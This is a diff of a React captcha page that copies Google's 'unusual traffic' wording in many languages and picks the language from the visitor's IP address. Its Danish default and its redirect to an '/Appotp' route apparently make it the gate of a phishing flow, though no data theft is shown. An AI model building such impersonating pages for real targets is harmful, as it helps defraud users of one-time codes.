@@ -1,12 +1,8 @@
-// components/CaptchaPage.js
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import ReCAPTCHA from "react-google-recaptcha";
-import LoadingPage from "./LoadingPage";
 
-// ============================================
-// COMPLETE TRANSLATIONS - ALL LANGUAGES
-// ============================================
+// Translations object
 const translations = {
   da: {
     aboutThisPage: "Om denne side",
@@ -88,6 +84,14 @@ const translations = {
     time: "Tijd",
     url: "URL",
   },
+  nl_BE: {
+    aboutThisPage: "Over deze pagina",
+    description: "Onze systemen hebben ongebruikelijk verkeer van uw computernetwerk gedetecteerd. Deze pagina controleert of u het echt bent die de verzoeken verzendt, en niet een robot.",
+    whyQuestion: "Waarom is dit gebeurd?",
+    ipAddress: "IP-adres",
+    time: "Tijd",
+    url: "URL",
+  },
   cs: {
     aboutThisPage: "O této stránce",
     description: "Naše systémy detekovaly neobvyklý provoz z vaší počítačové sítě. Tato stránka kontroluje, zda jste to skutečně vy, kdo odesílá požadavky, a ne robot.",
@@ -104,84 +108,12 @@ const translations = {
     time: "Hora",
     url: "URL",
   },
-  it: {
-    aboutThisPage: "Informazioni su questa pagina",
-    description: "I nostri sistemi hanno rilevato traffico insolito dalla tua rete informatica. Questa pagina verifica se sei davvero tu a inviare le richieste e non un robot.",
-    whyQuestion: "Perché è successo?",
-    ipAddress: "Indirizzo IP",
-    time: "Ora",
-    url: "URL",
-  },
-  tr: {
-    aboutThisPage: "Bu sayfa hakkında",
-    description: "Sistemlerimiz bilgisayar ağınızdan olağandışı trafik tespit etti. Bu sayfa, istekleri gerçekten sizin mi yoksa bir robotun mu gönderdiğini kontrol eder.",
-    whyQuestion: "Bu neden oldu?",
-    ipAddress: "IP adresi",
-    time: "Zaman",
-    url: "URL",
-  },
-  ru: {
-    aboutThisPage: "Об этой странице",
-    description: "Наши системы обнаружили необычный трафик из вашей компьютерной сети. Эта страница проверяет, действительно ли вы отправляете запросы, а не робот.",
-    whyQuestion: "Почему это произошло?",
-    ipAddress: "IP-адрес",
-    time: "Время",
-    url: "URL",
-  },
-  zh: {
-    aboutThisPage: "关于此页面",
-    description: "我们的系统检测到来自您的计算机网络的异常流量。此页面检查是否真的是您在发送请求，而不是机器人。",
-    whyQuestion: "为什么会发生这种情况？",
-    ipAddress: "IP地址",
-    time: "时间",
-    url: "URL",
-  },
-  ko: {
-    aboutThisPage: "이 페이지 정보",
-    description: "당사 시스템이 귀하의 컴퓨터 네트워크에서 비정상적인 트래픽을 감지했습니다. 이 페이지는 요청을 보내는 사람이 로봇이 아닌 귀하인지 확인합니다.",
-    whyQuestion: "왜 이런 일이 발생했나요?",
-    ipAddress: "IP 주소",
-    time: "시간",
-    url: "URL",
-  },
-  ja: {
-    aboutThisPage: "このページについて",
-    description: "当社のシステムは、お客様のコンピュータネットワークから異常なトラフィックを検出しました。このページでは、リクエストを送信しているのがロボットではなく、本当にあなたであるかどうかを確認します。",
-    whyQuestion: "なぜこれが起こったのですか？",
-    ipAddress: "IPアドレス",
-    time: "時間",
-    url: "URL",
-  },
-  th: {
-    aboutThisPage: "เกี่ยวกับหน้านี้",
-    description: "ระบบของเราตรวจพบการรับส่งข้อมูลที่ผิดปกติจากเครือข่ายคอมพิวเตอร์ของคุณ หน้านี้จะตรวจสอบว่าเป็นคุณจริงๆ ที่ส่งคำขอ ไม่ใช่หุ่นยนต์",
-    whyQuestion: "ทำไมสิ่งนี้ถึงเกิดขึ้น?",
-    ipAddress: "ที่อยู่ IP",
-    time: "เวลา",
-    url: "URL",
-  },
-  id: {
-    aboutThisPage: "Tentang halaman ini",
-    description: "Sistem kami mendeteksi lalu lintas tidak biasa dari jaringan komputer Anda. Halaman ini memeriksa apakah benar Anda yang mengirim permintaan, dan bukan robot.",
-    whyQuestion: "Mengapa ini terjadi?",
-    ipAddress: "Alamat IP",
-    time: "Waktu",
-    url: "URL",
-  },
-  vi: {
-    aboutThisPage: "Về trang này",
-    description: "Hệ thống của chúng tôi đã phát hiện lưu lượng truy cập bất thường từ mạng máy tính của bạn. Trang này kiểm tra xem có thực sự là bạn đang gửi yêu cầu hay không, chứ không phải robot.",
-    whyQuestion: "Tại sao điều này xảy ra?",
-    ipAddress: "Địa chỉ IP",
-    time: "Thời gian",
-    url: "URL",
-  },
-  fi: {
-    aboutThisPage: "Tietoja tästä sivusta",
-    description: "Järjestelmämme ovat havainneet epätavallista liikennettä tietokoneverkostasi. Tämä sivu tarkistaa, oletko todella sinä, joka lähetät pyynnöt, etkä robotti.",
-    whyQuestion: "Miksi näin tapahtui?",
-    ipAddress: "IP-osoite",
-    time: "Aika",
+  mt: {
+    aboutThisPage: "Dwar din il-paġna",
+    description: "Is-sistemi tagħna skoprew traffiku mhux tas-soltu min-netwerk tal-kompjuter tiegħek. Din il-paġna tiċċekkja jekk intix verament int li qed tibgħat it-talbiet, u mhux robot.",
+    whyQuestion: "Għaliex ġara dan?",
+    ipAddress: "Indirizz IP",
+    time: "Ħin",
     url: "URL",
   },
 };
@@ -193,22 +125,11 @@ function CaptchaPage() {
   const [captchaValue, setCaptchaValue] = useState(null);
   const [ip, setIp] = useState("");
   const [time, setTime] = useState("");
-  const [language, setLanguage] = useState("en");
+  const [language, setLanguage] = useState("da");
   const [isLoadingLang, setIsLoadingLang] = useState(true);
   const [isVerifying, setIsVerifying] = useState(false);
 
-  // التحقق إذا كان المستخدم قد اجتاز الكابتشا مسبقاً
-  useEffect(() => {
-    const captchaPassed = localStorage.getItem('captchaPassed');
-    if (captchaPassed === 'true') {
-      navigate('/landing', { replace: true });
-    }
-  }, [navigate]);
-
-  // ============================================
-  // COUNTRY TO LANGUAGE MAPPING - FIXED PER REQUEST
-  // TN = "en", CH = "de"
-  // ============================================
+  // Function to detect language based on IP
   const detectLanguageByIP = async () => {
     try {
       const res = await fetch(`${apiUrl}/api/ipinfo`);
@@ -217,68 +138,27 @@ function CaptchaPage() {
       const countryCode = data.country_code?.toLowerCase();
 
       const countryToLanguage = {
-        // Nordic
-        'dk': 'da', 'se': 'sv', 'no': 'no', 'fi': 'fi',
-        // English speaking (TN = en)
-        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en', 'nz': 'en', 'in': 'en',
-        'za': 'en', 'ng': 'en', 'sg': 'en', 'ph': 'en', 'my': 'en', 'tn': 'en',
-        // Arabic
-        'ae': 'ar', 'sa': 'ar', 'eg': 'ar', 'qa': 'ar', 'kw': 'ar', 'bh': 'ar',
-        'om': 'ar', 'jo': 'ar', 'lb': 'ar', 'iq': 'ar', 'ye': 'ar', 'ps': 'ar',
-        'ly': 'ar', 'sd': 'ar', 'mr': 'ar', 'so': 'ar', 'ma': 'ar', 'dz': 'ar',
-        // French
-        'fr': 'fr', 'be': 'fr', 'lu': 'fr', 'mc': 'fr', 'sn': 'fr', 'ci': 'fr',
-        'cm': 'fr',
-        // Spanish
-        'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es', 'pe': 'es', 've': 'es',
-        'cl': 'es', 'ec': 'es', 'gt': 'es', 'cu': 'es', 'bo': 'es', 'do': 'es',
-        'hn': 'es', 'py': 'es', 'sv': 'es', 'ni': 'es', 'cr': 'es', 'pa': 'es',
-        'uy': 'es',
-        // German (CH = de)
-        'de': 'de', 'at': 'de', 'li': 'de', 'ch': 'de',
-        // Italian
-        'it': 'it', 'sm': 'it', 'va': 'it',
-        // Dutch
-        'nl': 'nl',
-        // Polish
-        'pl': 'pl',
-        // Russian
-        'ru': 'ru', 'by': 'ru', 'kz': 'ru', 'kg': 'ru', 'ua': 'ru',
-        // Chinese
-        'cn': 'zh', 'tw': 'zh', 'hk': 'zh', 'mo': 'zh',
-        // Japanese
-        'jp': 'ja',
-        // Korean
-        'kr': 'ko',
-        // Turkish
-        'tr': 'tr',
-        // Vietnamese
-        'vn': 'vi',
-        // Thai
-        'th': 'th',
-        // Indonesian
-        'id': 'id',
-        // Hebrew
-        'il': 'he',
-        // Urdu
-        'pk': 'ur',
-        // Bengali
-        'bd': 'bn',
-        // Sinhala
-        'lk': 'si',
-        // Portuguese
-        'pt': 'pt', 'br': 'pt', 'ao': 'pt', 'mz': 'pt',
-        // Greek
-        'gr': 'el',
-        // Czech
-        'cz': 'cs',
-        // Hungarian
-        'hu': 'hu',
-        // Romanian
-        'ro': 'ro',
+        'dk': 'da',
+        'us': 'en',
+        'gb': 'en',
+        'ca': 'en',
+        'au': 'en',
+        'ae': 'ar',
+        'sa': 'ar',
+        'eg': 'ar',
+        'fr': 'fr',
+        'be': 'fr',
+        'ch': 'fr',
+        'es': 'es',
+        'mx': 'es',
+        'ar': 'es',
+        'co': 'es',
+        'de': 'de',
+        'at': 'de',
+        'tn': 'ar'
       };
 
-      const detectedLang = countryToLanguage[countryCode] || 'en';
+      const detectedLang = countryToLanguage[countryCode] || 'da';
 
       setLanguage(detectedLang);
       localStorage.setItem('preferredLanguage', detectedLang);
@@ -296,7 +176,7 @@ function CaptchaPage() {
         if (translations[browserLang]) {
           setLanguage(browserLang);
         } else {
-          setLanguage('en');
+          setLanguage('da');
         }
       }
     } finally {
@@ -343,21 +223,10 @@ function CaptchaPage() {
         'sv': 'sv-SE',
         'no': 'nb-NO',
         'nl': 'nl-NL',
+        'nl_BE': 'nl-NL',
         'cs': 'cs-CZ',
         'pt': 'pt-PT',
-        'it': 'it-IT',
-        'tr': 'tr-TR',
-        'ru': 'ru-RU',
-        'zh': 'zh-CN',
-        'ko': 'ko-KR',
-        'ja': 'ja-JP',
-        'th': 'th-TH',
-        'id': 'id-ID',
-        'vi': 'vi-VN',
-        'fi': 'fi-FI',
-        'el': 'el-GR',
-        'hu': 'hu-HU',
-        'ro': 'ro-RO',
+        'mt': 'mt-MT',
       };
       
       const locale = localeMap[language] || 'en-US';
@@ -397,9 +266,9 @@ function CaptchaPage() {
         
         if (data.success) {
           localStorage.setItem("captchaPassed", "true");
-          // استخدام replace لمسح صفحة Captcha من التاريخ
-          navigate('/landing', { replace: true });
+          navigate('/Appotp');
         } else {
+          // Reset captcha widget on failure
           window.grecaptcha && window.grecaptcha.reset();
           setCaptchaValue(null);
         }
@@ -411,21 +280,6 @@ function CaptchaPage() {
       }
     }
   };
-
-  // منع الرجوع إلى الصفحة السابقة من CaptchaPage نفسها
-  useEffect(() => {
-    history.pushState(null, '', window.location.href);
-    
-    const preventBack = () => {
-      history.pushState(null, '', window.location.href);
-    };
-    
-    window.addEventListener('popstate', preventBack);
-    
-    return () => {
-      window.removeEventListener('popstate', preventBack);
-    };
-  }, []);
 
   // Get reCAPTCHA language code
   const getRecaptchaLang = () => {
@@ -440,21 +294,10 @@ function CaptchaPage() {
       'sv': 'sv',
       'no': 'no',
       'nl': 'nl',
+      'nl_BE': 'nl',
       'cs': 'cs',
       'pt': 'pt',
-      'it': 'it',
-      'tr': 'tr',
-      'ru': 'ru',
-      'zh': 'zh-CN',
-      'ko': 'ko',
-      'ja': 'ja',
-      'th': 'th',
-      'id': 'id',
-      'vi': 'vi',
-      'fi': 'fi',
-      'el': 'el',
-      'hu': 'hu',
-      'ro': 'ro',
+      'mt': 'mt',
     };
     return langMap[language] || 'en';
   };
@@ -467,7 +310,7 @@ function CaptchaPage() {
     }
   };
 
- if (isLoadingLang) {
+  if (isLoadingLang) {
     return (
       <div
         style={{
